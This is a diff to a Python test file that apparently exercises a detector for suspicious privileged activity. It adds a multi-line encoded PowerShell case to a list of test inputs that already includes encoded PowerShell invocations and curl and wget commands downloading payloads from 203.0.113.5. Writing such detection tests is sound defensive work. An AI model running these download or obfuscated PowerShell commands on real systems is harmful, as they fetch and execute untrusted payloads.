@@ -69,6 +69,7 @@ def test_privileged_activity_evidence_handles_missing_source_ip():
     [
         "powershell -EncodedCommand AAAA",
         "POWERSHELL.EXE -ENC AAAA",
+        "powershell -NoProfile\nGet-Date -enc AAAA",
         r"C:\Windows\System32\curl.exe -O http://203.0.113.5/x",
         "CURL http://203.0.113.5/payload",
         "wget http://203.0.113.5/x",
